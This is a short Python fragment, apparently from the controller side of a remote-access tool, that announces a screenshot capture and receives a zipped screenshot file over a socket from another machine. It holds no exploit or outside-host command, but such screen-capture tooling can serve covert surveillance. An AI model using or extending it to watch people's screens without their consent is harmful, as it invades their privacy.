

def capture_screenshot(my_socket):
    print("\t\t[+] Taking a screen shot")

    name = "screenshot.zip"
    my_socket.receive_zipped(name)
    